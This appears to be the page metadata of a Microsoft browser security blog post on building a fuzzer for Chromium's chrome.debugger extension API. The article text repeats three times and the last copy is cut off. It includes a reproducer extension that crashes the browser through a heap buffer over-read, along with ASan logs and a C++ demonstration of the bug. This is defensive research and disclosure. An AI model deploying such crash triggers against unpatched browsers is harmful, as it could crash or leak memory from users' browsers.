<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="twitter:image" content="https://microsoftedge.github.io/edgevr/assets/img/edge-logo-128x128.png"><title>A Story of a Bug Found Fuzzing | Microsoft Browser Vulnerability Research</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="A Story of a Bug Found Fuzzing" /><meta name="author" content="Abdulrahman Alqabandi" /><meta property="og:locale" content="en_US" /><meta name="description" content="In a previous blogpost it covered and mentioned automation and how it is great at finding memory issues. We also got some feedback to expand on fuzzing, so this post will cover how we came to develop a fuzzer and how it found its first security issue early in development. The main intention of this fuzzer is to use the signal from MSRC cases and see if it can find the next bug before it gets reported which follows the same pattern. The result was a cool browser fuzzer and the experiment yielded interesting results. The Target We noticed a pattern in recent memory corruption bugs affecting both Edge and Chromium where an extension was used as a proof of concept. This was particularly interesting to me because I looked at extensions a few years ago and only found logic bugs and, with an itch to make an experimental fuzzer why not try to create an extension based fuzzer for some variant hunting. Now that I have a general component (Web Extensions) as a target, where to start? When reading through all of the publicly disclosed chromium bugs that involved an extension and a browser crash, two bugs from David Erceg stood out (1188889, 1190550) where the chrome.debugger.sendCommand was used and it was interesting. The chrome.debugger extension API allows you to control some tabs using the devtools protocol, this is the same protocol remote debugging uses. The function sendCommand stood out which looks like the following: 1 2 3 4 5 6 chrome.debugger.sendCommand( target: Debuggee, method: string, commandParams?: object, callback?: function, ) This looks like a promising function to start fuzzing. Gathering More Information Now that a more specific API was identified, let’s look at what kind of input it takes: target: This is a simple object that contains either the extensionId, tabId or targetId of the target. method: This is a string that must contain valid values, can’t generate random strings here. commandParams: “JSON object with request parameters. This object must conform to the remote debugging params scheme for given method.” Also can’t generate random strings here for param names. callback: expected In order to create valid and relevant method and command parameters, we need to look up and learn about this devtools protocol. Thankfully, the devtools folks have a JSON file describing all these method names and their parameters including what type of values they expect. Perfect! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 { &quot;version&quot;: { &quot;major&quot;: &quot;1&quot;, &quot;minor&quot;: &quot;3&quot; }, &quot;domains&quot;: [ { &quot;domain&quot;: &quot;Accessibility&quot;, &quot;experimental&quot;: true, &quot;dependencies&quot;: [ &quot;DOM&quot; ], &quot;types&quot;: [ { &quot;id&quot;: &quot;AXNodeId&quot;, &quot;description&quot;: &quot;Unique accessibility node identifier.&quot;, &quot;type&quot;: &quot;string&quot; }, { &quot;id&quot;: &quot;AXValueType&quot;, &quot;description&quot;: &quot;Enum of possible property types.&quot;, &quot;type&quot;: &quot;string&quot;, &quot;enum&quot;: [ &quot;boolean&quot;, &quot;tristate&quot;, &quot;booleanOrUndefined&quot;, &quot;idref&quot;, &quot;idrefList&quot;, &quot;integer&quot;, .. ... This means the extension that eventually gets installed on the browser can consume this JSON file and use its data to construct somewhat valid devtools protocol commands. Since the types are described, it can generate the value of any given type with random values conveniently. But wait, if this fuzzer needs to install an extension on the fly, how can that be achieved? The Harness The great thing about Chromium is that there are a lot of run time flags that do all sorts of things. In this case there are a couple of flags that will load extensions on startup: --disable-extensions-except=&quot;C:/ext/&quot; --load-extension=&quot;C:/ext/&quot; (You can find a list of these flags here, though not actively maintained so make sure to verify by looking up the flag in chromium source) This harness will be simple and straightforward, all it needs is to control the launching of the target binary (the browser) with command line flags as well as handle/detect all types of crashes. Additionally, it needs to log everything and make sure the fuzzing process runs continuously. Sometimes it’s the job of the harness to feed testcases into the browser but for this case we only load one ‘testcase’ (an extension) that continuously runs until a crash or timeout then the harness repeats. This basic harness is using NodeJS and it does the following: Contain a list of useful flags (like --no-sandbox which is important in ASan builds as otherwise we won’t see child process crashes) Spawn browser using the flags Save all stdout from the browser process Handle gracefully when browser crashes Check crash signal Save ASan report and stdout logs Clean up and restart The Extension As mentioned before, the way it will be fuzzing the extension API is by loading one giant extension and listen for crashes. It seems much faster than creating thousands of extensions and loading them, but with this speed come some drawbacks. The idea of this extension is for it to have all the permissions that are relevant to us, in this case the debugging permission and others which can be helpful (tabs and &lt;all_urls&gt; host permission). Once it loads it will consume the devtools protocol JSON ‘database’ and using the data there it creates somewhat valid devtools protocol commands. Some sample generated commands: We’re not paying much attention to the semantics of the fuzzed values as far as parameter values (the names should be valid), some will throw errors and that’s fine for now. We want to quickly get our fuzzer running and then improvements can be made. As soon as all the pieces were connected and the fuzzer was running, a lot of crashes started occurring and other annoyances like randomly generated commands can result in either the extension crashing or stalling. Once these initial “fuzz blocker” bugs got fixed the fuzzer ran smoothly for a short time before finding the first valid security bug. 1 2 3 4 ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11f305796100 at pc 0x7ff8dd649dfc bp 0x00c8065fd2f0 sp 0x00c8065fd338 READ of size 2 at 0x11f305796100 thread T0 #0 0x7ff8dd649dfb in std::__1::basic_string&lt;char16_t,std::__1::char_traits&lt;char16_t&gt;,std::__1::allocator&lt;char16_t&gt; &gt;::basic_string&lt;std::nullptr_t&gt; C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\string:835 #1 0x7ff8dd649a84 in mojo::StructPtr&lt;blink::mojom::KeyData&gt;::StructPtr&lt;const int &amp;,const int &amp;,const int &amp;,const int &amp;,const bool &amp;,const bool &amp;,const char16_t (&amp;)[4],const char16_t (&amp;)[4]&gt; C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\struct_ptr.h:63 This is always a great sign, especially early in development. However, some of the early decisions came back to bite. The decision to only have one extension rather than generating thousands of extensions meant we do not have a conventional testcase that reproduced this crash once a crash occurred. Instead, we rely on logging to see which commands were fired before the crash. The logs showed the following command call right before crash: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 chrome.debugger.sendCommand({ tabId: atabid }, &quot;Input.dispatchKeyEvent&quot;, { type: unescape(&quot;keyDown&quot;), modifiers: -1, TimeSinceEpoch: -129, text: unescape(&quot;%uA8E9%5E%uD866%uDD5E&quot;), unmodifiedText: unescape(&quot;%uD834%uDD6F%uDB43%uDD46&quot;), keyIdentifier: unescape(&quot;%26%3D%uDB40%uDCF6%u0660&quot;), code: unescape(&quot;%7C%uE468&quot;), key: unescape(&quot;%uC79B%uD84A%uDFF9%uD834%uDD66%uDB42%uDDE5%uD85E%uDFD1&quot;), windowsVirtualKeyCode: -128, nativeVirtualKeyCode: 16, autoRepeat: false, isKeypad: false, isSystemKey: false, location: 4096, commands: [&quot;≤áÄí-&quot;], }); When running this command manually in a plain extension it did not crash the browser. After some digging around it turns out we had to run it multiple times as we opened a new window as a debug target. The reliably reproducible extension testcase looked like this now: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 var atabid; chrome.windows.create({ url: &quot;about:blank&quot;, type: &quot;normal&quot; }, (w) =&gt; { atabid = w.tabs[0].id; chrome.debugger.attach({ tabId: atabid }, &quot;1.3&quot;, function () { setInterval((g) =&gt; { chrome.debugger.sendCommand({ tabId: atabid }, &quot;Input.dispatchKeyEvent&quot;, { type: unescape(&quot;keyDown&quot;), modifiers: -1, TimeSinceEpoch: -129, text: unescape(&quot;%uA8E9%5E%uD866%uDD5E&quot;), unmodifiedText: unescape(&quot;%uD834%uDD6F%uDB43%uDD46&quot;), keyIdentifier: unescape(&quot;%26%3D%uDB40%uDCF6%u0660&quot;), code: unescape(&quot;%7C%uE468&quot;), key: unescape(&quot;%uC79B%uD84A%uDFF9%uD834%uDD66%uDB42%uDDE5%uD85E%uDFD1&quot;), windowsVirtualKeyCode: -128, nativeVirtualKeyCode: 16, autoRepeat: false, isKeypad: false, isSystemKey: false, location: 4096, commands: [&quot;≤áÄí-&quot;], }); }, 100); }); }); Once we were able to reliably crash the browser it turned out to be an upstream issue and so it was reported to them. The bug report is now public and you can see it here. What Happened The bug is due to unmodifiedText (line 11 in the last screenshot) was handled in the browser process without taking account of null termination which lead to a heap buffer overflow (read), as caseq@ (assigned to this bug) mentions: “…That said, this may lead to us sending a piece of browser memory into renderer.” Let’s take a closer look: 1 2 3 4 5 6 7 8 9 10 11 12 #include &lt;uchar.h&gt; #include &lt;stdio.h&gt; #include &lt;string&gt; int main(void) { char16_t char16[] = u&quot;ABCD&quot;; std::u16string text16(u&quot;ABCD&quot;); printf(&quot;size of char16 = %zu\n&quot;, sizeof char16 / sizeof *char16); printf(&quot;size of text16 = %zu\n&quot;, text16.size()); } Out: 1 2 3 PS C:\Users\test\Desktop\mkhtbr&gt; ./test.exe size of char16 = 5 size of text16 = 4 Note the above output; char16_t should end with a null byte which is why its size is bigger than the u16string. Let’s modify this to replicate the same underlying bug found: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include &lt;uchar.h&gt; #include &lt;stdio.h&gt; #include &lt;string&gt; int main(void) { char16_t *char16=(char16_t*)malloc(4 * sizeof(char16_t)); std::u16string text16(u&quot;ABCD&quot;); printf(&quot;size of char16 = %zu\n&quot;, sizeof char16 / sizeof *char16); printf(&quot;size of text16 = %zu\n&quot;, text16.size()); for (size_t i = 0; i &lt; text16.size(); ++i){ char16[i] = text16[i]; } // Try to access everything in the &#39;char16_t&#39; array assuming &#39;4&#39; is limit. for (size_t n = 0; n &lt;= 4; n++) { printf(&quot;n=%#x &amp; &quot;, n); printf(&quot;char16[n]=%#x\n&quot;, char16[n]); } } We compile using AddressSanitizer by executing the following: 1 clang++ -O1 -g -fsanitize=address -fno-omit-frame-pointer -o a.exe .\old.cpp Finally, we run it: 1 2 3 4 5 6 7 8 9 10 11 PS C:\Users\test\Desktop\mkhtbr&gt; ./test.exe size of char16 = 4 size of text16 = 4 n=0 &amp; char16[n]=0x41 n=0x1 &amp; char16[n]=0x42 n=0x2 &amp; char16[n]=0x43 n=0x3 &amp; char16[n]=0x44 n=0x4 &amp; ================================================================= ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11cdab3a0038 at pc 0x7ff780c517d1 bp 0x0044ccf0f4e0 sp 0x0044ccf0f528 READ of size 2 at 0x11cdab3a0038 thread T0 #0 0x7ff780c517d0 in main C:/Users/test/Desktop/mkhtbr/./test.cpp:20:35 As you can see, this is the same crash as the Chromium bug. Upstream fixed it swiftly and correctly guessed it was a bug that’s been there for a while (which meant it was likely in the stable version affecting all users). Conclusion We’ve only covered the initial development of this fuzzer, we’re continuously developing it by adding more APIs and running it during development. So far it has found the following security issues: ID Title Upstream Severity N/A Heap UaF in edge::fre:: █ █ █ █:: █ █ █ █ █ No High 1297404 Heap UaF in global_media_controls::MediaItemManagerImpl::HideItem Yes High 1283077 Heap buffer overflow read in webui tabstrip Yes High 1276331 Heap buffer overflow read in blink::mojom::WidgetInputHandlerProxy::DispatchEvent Yes High Here is what it looks like currently when running it, it gets progressively chaotic as time goes by (not sped up and using ASan). Coming Soon We will soon be posting another guest blogpost by David Erceg where he will discuss some of the bugs he found as well as sharing his methodology. Also included in the post will be some of the ways the Edge Security Team reacted to his reports to find variants. Until then, check out his first guest blogpost if you haven’t already." /><meta property="og:description" content="In a previous blogpost it covered and mentioned automation and how it is great at finding memory issues. We also got some feedback to expand on fuzzing, so this post will cover how we came to develop a fuzzer and how it found its first security issue early in development. The main intention of this fuzzer is to use the signal from MSRC cases and see if it can find the next bug before it gets reported which follows the same pattern. The result was a cool browser fuzzer and the experiment yielded interesting results. The Target We noticed a pattern in recent memory corruption bugs affecting both Edge and Chromium where an extension was used as a proof of concept. This was particularly interesting to me because I looked at extensions a few years ago and only found logic bugs and, with an itch to make an experimental fuzzer why not try to create an extension based fuzzer for some variant hunting. Now that I have a general component (Web Extensions) as a target, where to start? When reading through all of the publicly disclosed chromium bugs that involved an extension and a browser crash, two bugs from David Erceg stood out (1188889, 1190550) where the chrome.debugger.sendCommand was used and it was interesting. The chrome.debugger extension API allows you to control some tabs using the devtools protocol, this is the same protocol remote debugging uses. The function sendCommand stood out which looks like the following: 1 2 3 4 5 6 chrome.debugger.sendCommand( target: Debuggee, method: string, commandParams?: object, callback?: function, ) This looks like a promising function to start fuzzing. Gathering More Information Now that a more specific API was identified, let’s look at what kind of input it takes: target: This is a simple object that contains either the extensionId, tabId or targetId of the target. method: This is a string that must contain valid values, can’t generate random strings here. commandParams: “JSON object with request parameters. This object must conform to the remote debugging params scheme for given method.” Also can’t generate random strings here for param names. callback: expected In order to create valid and relevant method and command parameters, we need to look up and learn about this devtools protocol. Thankfully, the devtools folks have a JSON file describing all these method names and their parameters including what type of values they expect. Perfect! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 { &quot;version&quot;: { &quot;major&quot;: &quot;1&quot;, &quot;minor&quot;: &quot;3&quot; }, &quot;domains&quot;: [ { &quot;domain&quot;: &quot;Accessibility&quot;, &quot;experimental&quot;: true, &quot;dependencies&quot;: [ &quot;DOM&quot; ], &quot;types&quot;: [ { &quot;id&quot;: &quot;AXNodeId&quot;, &quot;description&quot;: &quot;Unique accessibility node identifier.&quot;, &quot;type&quot;: &quot;string&quot; }, { &quot;id&quot;: &quot;AXValueType&quot;, &quot;description&quot;: &quot;Enum of possible property types.&quot;, &quot;type&quot;: &quot;string&quot;, &quot;enum&quot;: [ &quot;boolean&quot;, &quot;tristate&quot;, &quot;booleanOrUndefined&quot;, &quot;idref&quot;, &quot;idrefList&quot;, &quot;integer&quot;, .. ... This means the extension that eventually gets installed on the browser can consume this JSON file and use its data to construct somewhat valid devtools protocol commands. Since the types are described, it can generate the value of any given type with random values conveniently. But wait, if this fuzzer needs to install an extension on the fly, how can that be achieved? The Harness The great thing about Chromium is that there are a lot of run time flags that do all sorts of things. In this case there are a couple of flags that will load extensions on startup: --disable-extensions-except=&quot;C:/ext/&quot; --load-extension=&quot;C:/ext/&quot; (You can find a list of these flags here, though not actively maintained so make sure to verify by looking up the flag in chromium source) This harness will be simple and straightforward, all it needs is to control the launching of the target binary (the browser) with command line flags as well as handle/detect all types of crashes. Additionally, it needs to log everything and make sure the fuzzing process runs continuously. Sometimes it’s the job of the harness to feed testcases into the browser but for this case we only load one ‘testcase’ (an extension) that continuously runs until a crash or timeout then the harness repeats. This basic harness is using NodeJS and it does the following: Contain a list of useful flags (like --no-sandbox which is important in ASan builds as otherwise we won’t see child process crashes) Spawn browser using the flags Save all stdout from the browser process Handle gracefully when browser crashes Check crash signal Save ASan report and stdout logs Clean up and restart The Extension As mentioned before, the way it will be fuzzing the extension API is by loading one giant extension and listen for crashes. It seems much faster than creating thousands of extensions and loading them, but with this speed come some drawbacks. The idea of this extension is for it to have all the permissions that are relevant to us, in this case the debugging permission and others which can be helpful (tabs and &lt;all_urls&gt; host permission). Once it loads it will consume the devtools protocol JSON ‘database’ and using the data there it creates somewhat valid devtools protocol commands. Some sample generated commands: We’re not paying much attention to the semantics of the fuzzed values as far as parameter values (the names should be valid), some will throw errors and that’s fine for now. We want to quickly get our fuzzer running and then improvements can be made. As soon as all the pieces were connected and the fuzzer was running, a lot of crashes started occurring and other annoyances like randomly generated commands can result in either the extension crashing or stalling. Once these initial “fuzz blocker” bugs got fixed the fuzzer ran smoothly for a short time before finding the first valid security bug. 1 2 3 4 ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11f305796100 at pc 0x7ff8dd649dfc bp 0x00c8065fd2f0 sp 0x00c8065fd338 READ of size 2 at 0x11f305796100 thread T0 #0 0x7ff8dd649dfb in std::__1::basic_string&lt;char16_t,std::__1::char_traits&lt;char16_t&gt;,std::__1::allocator&lt;char16_t&gt; &gt;::basic_string&lt;std::nullptr_t&gt; C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\string:835 #1 0x7ff8dd649a84 in mojo::StructPtr&lt;blink::mojom::KeyData&gt;::StructPtr&lt;const int &amp;,const int &amp;,const int &amp;,const int &amp;,const bool &amp;,const bool &amp;,const char16_t (&amp;)[4],const char16_t (&amp;)[4]&gt; C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\struct_ptr.h:63 This is always a great sign, especially early in development. However, some of the early decisions came back to bite. The decision to only have one extension rather than generating thousands of extensions meant we do not have a conventional testcase that reproduced this crash once a crash occurred. Instead, we rely on logging to see which commands were fired before the crash. The logs showed the following command call right before crash: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 chrome.debugger.sendCommand({ tabId: atabid }, &quot;Input.dispatchKeyEvent&quot;, { type: unescape(&quot;keyDown&quot;), modifiers: -1, TimeSinceEpoch: -129, text: unescape(&quot;%uA8E9%5E%uD866%uDD5E&quot;), unmodifiedText: unescape(&quot;%uD834%uDD6F%uDB43%uDD46&quot;), keyIdentifier: unescape(&quot;%26%3D%uDB40%uDCF6%u0660&quot;), code: unescape(&quot;%7C%uE468&quot;), key: unescape(&quot;%uC79B%uD84A%uDFF9%uD834%uDD66%uDB42%uDDE5%uD85E%uDFD1&quot;), windowsVirtualKeyCode: -128, nativeVirtualKeyCode: 16, autoRepeat: false, isKeypad: false, isSystemKey: false, location: 4096, commands: [&quot;≤áÄí-&quot;], }); When running this command manually in a plain extension it did not crash the browser. After some digging around it turns out we had to run it multiple times as we opened a new window as a debug target. The reliably reproducible extension testcase looked like this now: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 var atabid; chrome.windows.create({ url: &quot;about:blank&quot;, type: &quot;normal&quot; }, (w) =&gt; { atabid = w.tabs[0].id; chrome.debugger.attach({ tabId: atabid }, &quot;1.3&quot;, function () { setInterval((g) =&gt; { chrome.debugger.sendCommand({ tabId: atabid }, &quot;Input.dispatchKeyEvent&quot;, { type: unescape(&quot;keyDown&quot;), modifiers: -1, TimeSinceEpoch: -129, text: unescape(&quot;%uA8E9%5E%uD866%uDD5E&quot;), unmodifiedText: unescape(&quot;%uD834%uDD6F%uDB43%uDD46&quot;), keyIdentifier: unescape(&quot;%26%3D%uDB40%uDCF6%u0660&quot;), code: unescape(&quot;%7C%uE468&quot;), key: unescape(&quot;%uC79B%uD84A%uDFF9%uD834%uDD66%uDB42%uDDE5%uD85E%uDFD1&quot;), windowsVirtualKeyCode: -128, nativeVirtualKeyCode: 16, autoRepeat: false, isKeypad: false, isSystemKey: false, location: 4096, commands: [&quot;≤áÄí-&quot;], }); }, 100); }); }); Once we were able to reliably crash the browser it turned out to be an upstream issue and so it was reported to them. The bug report is now public and you can see it here. What Happened The bug is due to unmodifiedText (line 11 in the last screenshot) was handled in the browser process without taking account of null termination which lead to a heap buffer overflow (read), as caseq@ (assigned to this bug) mentions: “…That said, this may lead to us sending a piece of browser memory into renderer.” Let’s take a closer look: 1 2 3 4 5 6 7 8 9 10 11 12 #include &lt;uchar.h&gt; #include &lt;stdio.h&gt; #include &lt;string&gt; int main(void) { char16_t char16[] = u&quot;ABCD&quot;; std::u16string text16(u&quot;ABCD&quot;); printf(&quot;size of char16 = %zu\n&quot;, sizeof char16 / sizeof *char16); printf(&quot;size of text16 = %zu\n&quot;, text16.size()); } Out: 1 2 3 PS C:\Users\test\Desktop\mkhtbr&gt; ./test.exe size of char16 = 5 size of text16 = 4 Note the above output; char16_t should end with a null byte which is why its size is bigger than the u16string. Let’s modify this to replicate the same underlying bug found: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include &lt;uchar.h&gt; #include &lt;stdio.h&gt; #include &lt;string&gt; int main(void) { char16_t *char16=(char16_t*)malloc(4 * sizeof(char16_t)); std::u16string text16(u&quot;ABCD&quot;); printf(&quot;size of char16 = %zu\n&quot;, sizeof char16 / sizeof *char16); printf(&quot;size of text16 = %zu\n&quot;, text16.size()); for (size_t i = 0; i &lt; text16.size(); ++i){ char16[i] = text16[i]; } // Try to access everything in the &#39;char16_t&#39; array assuming &#39;4&#39; is limit. for (size_t n = 0; n &lt;= 4; n++) { printf(&quot;n=%#x &amp; &quot;, n); printf(&quot;char16[n]=%#x\n&quot;, char16[n]); } } We compile using AddressSanitizer by executing the following: 1 clang++ -O1 -g -fsanitize=address -fno-omit-frame-pointer -o a.exe .\old.cpp Finally, we run it: 1 2 3 4 5 6 7 8 9 10 11 PS C:\Users\test\Desktop\mkhtbr&gt; ./test.exe size of char16 = 4 size of text16 = 4 n=0 &amp; char16[n]=0x41 n=0x1 &amp; char16[n]=0x42 n=0x2 &amp; char16[n]=0x43 n=0x3 &amp; char16[n]=0x44 n=0x4 &amp; ================================================================= ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11cdab3a0038 at pc 0x7ff780c517d1 bp 0x0044ccf0f4e0 sp 0x0044ccf0f528 READ of size 2 at 0x11cdab3a0038 thread T0 #0 0x7ff780c517d0 in main C:/Users/test/Desktop/mkhtbr/./test.cpp:20:35 As you can see, this is the same crash as the Chromium bug. Upstream fixed it swiftly and correctly guessed it was a bug that’s been there for a while (which meant it was likely in the stable version affecting all users). Conclusion We’ve only covered the initial development of this fuzzer, we’re continuously developing it by adding more APIs and running it during development. So far it has found the following security issues: ID Title Upstream Severity N/A Heap UaF in edge::fre:: █ █ █ █:: █ █ █ █ █ No High 1297404 Heap UaF in global_media_controls::MediaItemManagerImpl::HideItem Yes High 1283077 Heap buffer overflow read in webui tabstrip Yes High 1276331 Heap buffer overflow read in blink::mojom::WidgetInputHandlerProxy::DispatchEvent Yes High Here is what it looks like currently when running it, it gets progressively chaotic as time goes by (not sped up and using ASan). Coming Soon We will soon be posting another guest blogpost by David Erceg where he will discuss some of the bugs he found as well as sharing his methodology. Also included in the post will be some of the ways the Edge Security Team reacted to his reports to find variants. Until then, check out his first guest blogpost if you haven’t already." /><link rel="canonical" href="https://microsoftedge.github.io/edgevr/posts/a-story-of-a-bug-found-fuzzing/" /><meta property="og:url" content="https://microsoftedge.github.io/edgevr/posts/a-story-of-a-bug-found-fuzzing/" /><meta property="og:site_name" content="Microsoft Browser Vulnerability Research" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-10T08:30:00-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="A Story of a Bug Found Fuzzing" /><meta name="twitter:site" content="@MSEdgeDev" /><meta name="twitter:creator" content="@Abdulrahman Alqabandi" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Abdulrahman Alqabandi"},"description":"In a previous blogpost it covered and mentioned automation and how it is great at finding memory issues. We also got some feedback to expand on fuzzing, so this post will cover how we came to develop a fuzzer and how it found its first security issue early in development. The main intention of this fuzzer is to use the signal from MSRC cases and see if it can find the next bug before it gets reported which follows the same pattern. The result was a cool browser fuzzer and the experiment yielded interesting results. The Target We noticed a pattern in recent memory corruption bugs affecting both Edge and Chromium where an extension was used as a proof of concept. This was particularly interesting to me because I looked at extensions a few years ago and only found logic bugs and, with an itch to make an experimental fuzzer why not try to create an extension based fuzzer for some variant hunting. Now that I have a general component (Web Extensions) as a target, where to start? When reading through all of the publicly disclosed chromium bugs that involved an extension and a browser crash, two bugs from David Erceg stood out (1188889, 1190550) where the chrome.debugger.sendCommand was used and it was interesting. The chrome.debugger extension API allows you to control some tabs using the devtools protocol, this is the same protocol remote debugging uses. The function sendCommand stood out which looks like the following: 1 2 3 4 5 6 chrome.debugger.sendCommand( target: Debuggee, method: string, commandParams?: object, callback?: function, ) This looks like a promising function to start fuzzing. Gathering More Information Now that a more specific API was identified, let’s look at what kind of input it takes: target: This is a simple object that contains either the extensionId, tabId or targetId of the target. method: This is a string that must contain valid values, can’t generate random strings here. commandParams: “JSON object with request parameters. This object must conform to the remote debugging params scheme for given method.” Also can’t generate random strings here for param names. callback: expected In order to create valid and relevant method and command parameters, we need to look up and learn about this devtools protocol. Thankfully, the devtools folks have a JSON file describing all these method names and their parameters including what type of values they expect. Perfect! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 { &quot;version&quot;: { &quot;major&quot;: &quot;1&quot;, &quot;minor&quot;: &quot;3&quot; }, &quot;domains&quot;: [ { &quot;domain&quot;: &quot;Accessibility&quot;, &quot;experimental&quot;: true, &quot;dependencies&quot;: [ &quot;DOM&quot; ], &quot;types&quot;: [ { &quot;id&quot;: &quot;AXNodeId&quot;, &quot;description&quot;: &quot;Unique accessibility node identifier.&quot;, &quot;type&quot;: &quot;string&quot; }, { &quot;id&quot;: &quot;AXValueType&quot;, &quot;description&quot;: &quot;Enum of possible property types.&quot;, &quot;type&quot;: &quot;string&quot;, &quot;enum&quot;: [ &quot;boolean&quot;, &quot;tristate&quot;, &quot;booleanOrUndefined&quot;, &quot;idref&quot;, &quot;idrefList&quot;, &quot;integer&quot;, .. ... This means the extension that eventually gets installed on the browser can consume this JSON file and use its data to construct somewhat valid devtools protocol commands. Since the types are described, it can generate the value of any given type with random values conveniently. But wait, if this fuzzer needs to install an extension on the fly, how can that be achieved? The Harness The great thing about Chromium is that there are a lot of run time flags that do all sorts of things. In this case there are a couple of flags that will load extensions on startup: --disable-extensions-except=&quot;C:/ext/&quot; --load-extension=&quot;C:/ext/&quot; (You can find a list of these flags here, though not actively maintained so make sure to verify by looking up the flag in chromium source) This harness will be simple and straightforward, all it needs is to control the launching of the target binary (the browser) with command line flags as well as handle/detect all types of crashes. Additionally, it needs to log everything and make sure the fuzzing process runs continuously. Sometimes it’s the job of the harness to feed testcases into the browser but for this case we only load one ‘testcase’ (an extension) that continuously runs until a crash or timeout then the harness repeats. This basic harness is using NodeJS and it does the following: Contain a list of useful flags (like --no-sandbox which is important in ASan builds as otherwise we won’t see child process crashes) Spawn browser using the flags Save all stdout from the browser process Handle gracefully when browser crashes Check crash signal Save ASan report and stdout logs Clean up and restart The Extension As mentioned before, the way it will be fuzzing the extension API is by loading one giant extension and listen for crashes. It seems much faster than creating thousands of extensions and loading them, but with this speed come some drawbacks. The idea of this extension is for it to have all the permissions that are relevant to us, in this case the debugging permission and others which can be helpful (tabs and &lt;all_urls&gt; host permission). Once it loads it will consume the devtools protocol JSON ‘database’ and using the data there it creates somewhat valid devtools protocol commands. Some sample generated commands: We’re not paying much attention to the semantics of the fuzzed values as far as parameter values (the names should be valid), some will throw errors and that’s fine for now. We want to quickly get our fuzzer running and then improvements can be made. As soon as all the pieces were connected and the fuzzer was running, a lot of crashes started occurring and other annoyances like randomly generated commands can result in either the extension crashing or stalling. Once these initial “fuzz blocker” bugs got fixed the fuzzer ran smoothly for a short time before finding the first valid security bug. 1 2 3 4 ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11f305796100 at pc 0x7ff8dd649dfc bp 0x00c8065fd2f0 sp 0x00c8065fd338 READ of size 2 at 0x11f305796100 thread T0 #0 0x7ff8dd649dfb in std::__1::basic_string&lt;char16_t,std::__1::char_traits&lt;char16_t&gt;,std::__1::allocator&lt;char16_t&gt; &gt;::basic_string&lt;std::nullptr_t&gt; C:\\b\\s\\w\\ir\\cache\\builder\\src\\buildtools\\third_party\\libc++\\trunk\\include\\string:835 #1 0x7ff8dd649a84 in mojo::StructPtr&lt;blink::mojom::KeyData&gt;::StructPtr&lt;const int &amp;,const int &amp;,const int &amp;,const int &amp;,const bool &amp;,const bool &amp;,const char16_t (&amp;)[4],const char16_t (&amp;)[4]&gt; C:\\b\\s\\w\\ir\\cache\\builder\\src\\mojo\\public\\cpp\\bindings\\struct_ptr.h:63 This is always a great sign, especially early in development. However, some of the early decisions came back to bite. The decision to only have one extension rather than generating thousands of extensions meant we do not have a conventional testcase that reproduced this crash once a crash occurred. Instead, we rely on logging to see which commands were fired before the crash. The logs showed the following command call right before crash: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 chrome.debugger.sendCommand({ tabId: atabid }, &quot;Input.dispatchKeyEvent&quot;, { type: unescape(&quot;keyDown&quot;), modifiers: -1, TimeSinceEpoch: -129, text: unescape(&quot;%uA8E9%5E%uD866%uDD5E&quot;), unmodifiedText: unescape(&quot;%uD834%uDD6F%uDB43%uDD46&quot;), keyIdentifier: unescape(&quot;%26%3D%uDB40%uDCF6%u0660&quot;), code: unescape(&quot;%7C%uE468&quot;), key: unescape(&quot;%uC79B%uD84A%uDFF9%uD834%uDD66%uDB42%uDDE5%uD85E%uDFD1&quot;), windowsVirtualKeyCode: -128, nativeVirtualKeyCode: 16, autoRepeat: false, isKeypad: false, isSystemKey: false, location: 4096, commands: [&quot;≤áÄí-&quot;], }); When running this command manually in a plain extension it did not crash the browser. After some digging around it turns out we had to run it multiple times as we opened a new window as a debug target. The reliably reproducible extension testcase looked like this now: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 var atabid; chrome.windows.create({ url: &quot;about:blank&quot;, type: &quot;normal&quot; }, (w) =&gt; { atabid = w.tabs[0].id; chrome.debugger.attach({ tabId: atabid }, &quot;1.3&quot;, function () { setInterval((g) =&gt; { chrome.debugger.sendCommand({ tabId: atabid }, &quot;Input.dispatchKeyEvent&quot;, { type: unescape(&quot;keyDown&quot;), modifiers: -1, TimeSinceEpoch: -129, text: unescape(&quot;%uA8E9%5E%uD866%uDD5E&quot;), unmodifiedText: unescape(&quot;%uD834%uDD6F%uDB43%uDD46&quot;), keyIdentifier: unescape(&quot;%26%3D%uDB40%uDCF6%u0660&quot;), code: unescape(&quot;%7C%uE468&quot;), key: unescape(&quot;%uC79B%uD84A%uDFF9%uD834%uDD66%uDB42%uDDE5%uD85E%uDFD1&quot;), windowsVirtualKeyCode: -128, nativeVirtualKeyCode: 16, autoRepeat: false, isKeypad: false, isSystemKey: false, location: 4096, commands: [&quot;≤áÄí-&quot;], }); }, 